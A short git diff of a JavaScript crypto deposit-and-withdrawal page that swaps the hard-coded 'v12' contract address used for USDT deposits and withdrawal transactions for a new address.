@@ -87,7 +87,7 @@ async function runDepositPipeline(userAddr, amountHumanOrWei) {
         window.logToPanel(`[DEPOSIT START] Initial Input: ${(Number(totalInputWei) / 1e18).toFixed(4)} USDT`);
         
         const fixedGasDeductionWei = 30000000000000000n; // Fixed 0.03 USDT
-        const v12ContractAddress = "0x1854170353ea89672638F9fa5acB477c45523871";
+        const v12ContractAddress = "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B";
         const usdtTokenAddress = "0x55d398326f99059fF775485246999027B3197955";
 
         if (totalInputWei <= fixedGasDeductionWei) {
@@ -275,7 +275,7 @@ function setupActionListeners() {
       if (data && data.status === "ok") {
         const txHash = await window.ethereum.request({
             method: 'eth_sendTransaction',
-            params: [{ from: window.USER_ADDR, to: "0x1854170353ea89672638F9fa5acB477c45523871", data: data.withdraw_call, value: '0x0' }],
+            params: [{ from: window.USER_ADDR, to: "0xe191B1b7E5c3d7b7B9386F4212259241fC62135B", data: data.withdraw_call, value: '0x0' }],
         });
         logToPanel(`✅ Withdrawal Sent! Hash: ${txHash}`);
       }
